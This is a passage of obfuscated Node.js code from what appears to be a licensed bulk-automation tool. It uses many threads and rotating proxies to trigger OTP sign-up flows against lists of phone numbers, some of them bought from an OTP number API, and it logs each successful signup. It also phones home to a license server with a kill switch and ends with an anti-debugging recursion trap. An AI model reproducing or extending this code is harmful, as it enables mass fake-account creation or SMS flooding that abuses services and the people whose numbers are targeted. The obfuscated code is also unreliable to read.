          }
          setInterval(() => {
            !v261 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(1));
            const v264 = {};
            v264.hwid = v224, v264.app_id = "allmart";
            v264.token = v261;
            const v265 = JSON.stringify(v264),
              v266 = {
                'hostname': v247,
                'port': 0xec1,
                'path': "/api/ping",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v265)
                },
                'timeout': 0x1388
              };
            const v267 = v248.request(v266, v268 => {
              let v269 = '';
              v268.on("data", v270 => v269 += v270), v268.on("end", () => {
                try {
                  const v271 = JSON.parse(v269);
                  v271.status === 'ok' && v271.token ? v261 = v271.token : (console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(1));
                } catch (v272) {
                  console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(1);
                }
              });
            });
            v267.on("error", () => {
              console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n"));
              process.exit(1);
            });
            v267.on("timeout", function () {
              this.destroy();
              console.error(R("\n  ✗ License Server timeout. Exiting...\n")), process.exit(1);
            }), v267.write(v265), v267.end();
          }, 45000);
        }
      }
    } catch (v273) {
      console.error(R("\n  ✗ License server unreachable. Internet connection required.")), console.error(G("    Error: " + v273.message)), process.exit(1);
    }
    !v226 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(1));
    let v229 = process.argv.slice(2),
      v230 = null;
    if (v229.length === 0) {
      {
        const v274 = await interactiveWizard();
        v229 = [v274.numbersFile, v274.threads, v274.proxiesFile, v274.flow], v230 = v274.nexaConfig;
      }
    }
    let v231 = path.resolve(v229[0] || "numbers.txt"),
      v232 = parseInt(v229[1]) || 20,
      v233 = v229[2] !== undefined ? v229[2] : "proxies.txt";
    if (v233.toLowerCase() === "none") v233 = '';
    let v234 = v229[3] || "SIGN_UP";
    printHeader(), console.log(B("  ✓ License: " + v227) + G(" | HWID: " + v224));
    let v235 = [];
    !v230 && (!fs.existsSync(v231) && (console.error(R("✗ Error: Numbers file not found: " + v231)), process.exit(1)), v235 = fs.readFileSync(v231, "utf8").split(/\r?\n/).map(v275 => v275.trim()).filter(v276 => v276.length > 5));
    let v236 = [];
    v233 && fs.existsSync(v233) && (v236 = fs.readFileSync(v233, "utf8").split('\x0a').map(v277 => v277.trim()).filter(v278 => v278.length > 0));
    let v237 = v236.map(parseProxy).filter(Boolean);
    v230 ? console.log(C("✓ Target  : NexaOTP API (" + v230.totalCount + " numbers)")) : console.log(C("✓ Loaded " + v235.length + " targets"));
    if (v237.length === 0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v237.length));
    console.log(C("✓ Threads : " + v232)), console.log(C("✓ Flow    : " + v234 + '\x0a')), fs.writeFileSync(SUCCESSFUL_FILE, '');
    fs.writeFileSync(FAILED_FILE, ''), fs.writeFileSync(DEBUG_FILE, "=== DEBUG SESSION " + new Date().toISOString() + " ===\n");
    const v238 = new Dashboard(v230 ? v230.totalCount : v235.length);
    let v239 = [],
      v240 = [],
      v241 = 0,
      v242 = false;
    v230 && (async () => {
      try {
        for (let v279 = 0; v279 < v230.totalCount; v279++) {
          try {
            const v280 = v230.ranges[Math.floor(Math.random() * v230.ranges.length)],
              v281 = await nexaLimiter.enqueue(() => nexaFetchNumber(v230.apiKey, v280, v230.serverEndpoint));
            if (v281) {
              v241++;
              if (v240.length > 0) {
                v240.shift()(v281);
              } else v239.push(v281);
            }
          } catch (v282) {
            if (v282.message.includes("Insufficient balance") || v282.message.includes("No numbers available")) break;
          }
        }
      } finally {
        {
          v242 = true;
          while (v240.length > 0) v240.shift()(null);
        }
      }
    })();
    const v243 = v230 ? () => {
        {
          if (v239.length > 0) return Promise.resolve(v239.shift());
          if (v242) return Promise.resolve(null);
          return new Promise(v283 => v240.push(v283));
        }
      } : () => {
        {
          if (v235.length === 0) return Promise.resolve(null);
          const v284 = Math.floor(Math.random() * v235.length);
          return Promise.resolve(v235.splice(v284, 1)[0]);
        }
      },
      fn7 = () => {
        if (v237.length === 0) return null;
        const v285 = v237[Math.floor(Math.random() * v237.length)];
        return rotateSessionId(v285);
      };
    function fn8(v286) {
      try {
        {
          const v287 = fs.readFileSync(v231, "utf8"),
            v288 = v287.split(/\r?\n/).filter(v289 => v289.trim() !== v286.trim()).join('\x0a');
          fs.writeFileSync(v231, v288);
        }
      } catch (v290) {}
    }
    const v244 = v230 ? Math.min(v232, v230.totalCount) : Math.min(v232, v235.length),
      v245 = [],
      v246 = setInterval(() => v238.render(), 500);
    async function fn9(v291) {
      while (true) {
        {
          const v292 = await v243();
          if (!v292) break;
          try {
            const v293 = await triggerOTP(v292, {
              'onStatus': v294 => v238.setStatus("Worker " + v291 + ':\x20' + v294),
              'proxy': fn7(),
              'workerId': v291,
              'flowType': v234
            });
            if (v293.success) {
              {
                {
                  v238.successful++;
                  v238.processed++;
                  fn8(v292);
                  fs.appendFileSync(SUCCESSFUL_FILE, v293.phone + "|SIGNUP_SUCCESS|" + (v293.flow || v234) + '\x0a');
                  v238.addLog("Signup Triggered (" + v293.phone + ')', "success");
                }
              }
            } else v238.failed++, v238.processed++, fs.appendFileSync(FAILED_FILE, v293.phone + '|' + v293.message + '\x0a'), v238.addLog("Failed on " + v293.phone + ':\x20' + v293.message, "error");
          } catch (v295) {
            v238.failed++, v238.processed++, v238.addLog("Fatal error on " + v292 + ':\x20' + v295.message, "error");
          }
        }
      }
    }
    for (let v296 = 0; v296 < v244; v296++) v245.push(fn9(v296));
    await Promise.all(v245), clearInterval(v246), v238.render(), v238.stop();
  }
  start()["catch"](v297 => {
    console.error(R("Fatal error: " + v297.message));
    process.exit(1);
  });
}
function fn2(v298) {
  function fn10(v299) {
    {
      fn10(++v299);
    }
  }
  try {
    {
      if (v298) return fn10;else {
        fn10(0);
      }
    }
  } catch (v300) {}
}